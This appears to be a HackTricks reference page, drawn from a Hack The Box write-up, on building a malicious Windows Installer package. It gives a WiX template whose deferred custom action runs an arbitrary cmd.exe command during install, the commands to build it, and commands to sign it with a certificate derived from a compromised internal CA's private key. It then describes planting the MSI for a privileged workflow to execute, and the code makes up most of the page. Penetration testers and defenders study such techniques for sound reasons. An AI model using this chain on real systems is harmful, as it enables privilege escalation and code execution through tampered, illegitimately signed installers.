---
title: "Create MSI with WIX"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/windows-hardening/windows-local-privilege-escalation/create-msi-with-wix.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: windows
---

# Creating a Custom-Action MSI with WiX

```
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
```
candle.exe -out C:\tmp\wix.wixobj C:\tmp\Ethereal\msi.xml
```
```
light.exe -out C:\tmp\Ethereal\rick.msi C:\tmp\wix.wixobj
```
### Signing step used in the original chain

The target workflow accepted packages signed by a compromised internal CA. The write-up derived a signing certificate from the recovered `MyCA.cer`/`MyCA.pvk`, created a PFX, and signed the MSI:[\[1\]](#references)

```
makecert.exe -n "CN=Ethereal" -pe -cy end `
  -ic C:\tmp\MyCA.cer -iv C:\tmp\MyCA.pvk -sky signature `
  -sv C:\tmp\rick.pvk C:\tmp\rick.cer
pvk2pfx.exe -pvk C:\tmp\rick.pvk -spc C:\tmp\rick.cer -pfx C:\tmp\rick.pfx
signtool.exe sign /f C:\tmp\rick.pfx C:\tmp\Ethereal\rick.msi
```
The attacker then placed the signed package in `D:\DEV\MSIs` and waited for the privileged workflow/user to execute it. Preserve that precondition when adapting the technique: without an elevated installation path, unsafe policy such as `AlwaysInstallElevated`, or a privileged victim, this package executes only with the current user’s rights.

## References

- [1] [Hack The Box - Ethereal: Creating Malicious msi and getting root - 0xRick’s Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [A quick introduction: Create an MSI installer with WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also[wixtools](http://wixtoolset.org) )
- [3] [Microsoft Learn — Deferred execution custom actions (`Impersonate`)](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-in-script-execution-options)
